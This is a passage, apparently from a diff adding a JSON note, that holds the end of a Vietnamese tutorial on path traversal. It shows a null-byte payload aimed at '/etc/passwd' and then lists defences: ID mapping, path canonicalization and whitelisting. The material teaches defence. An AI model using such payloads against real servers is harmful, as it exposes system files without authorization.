thống cắt bỏ toàn bộ chuỗi ký tự đằng sau nó tại tầng hệ điều hành.\n\n**Payload:** `../../../../etc/passwd%00` hoặc `../../../../etc/passwd\\u0000`\n\n---\n\n## 7. Các biện pháp phòng vệ (Mitigation)\n1. **Tránh nhận đầu vào trực tiếp:** Nên ánh xạ file qua một danh sách ID (ví dụ: `file_id=1`, `file_id=2`) thay vì cho phép truyền tên file trực tiếp.\n2. **Chuẩn hóa đường dẫn (Canonicalization):** Sử dụng các hàm thư viện chuẩn của ngôn ngữ để phân tích và chuẩn hóa đường dẫn (ví dụ: `realpath()` trong PHP, `getCanonicalPath()` trong Java), sau đó so sánh xem nó có nằm trong thư mục gốc được cho phép hay không.\n3. **Sử dụng Whitelist:** Chỉ cho phép truy cập các tệp nằm trong một danh sách cố định.",
+      "createdAt": 1790494086229,
+      "updatedAt": 1790494086229
+    }
+  ]
+}
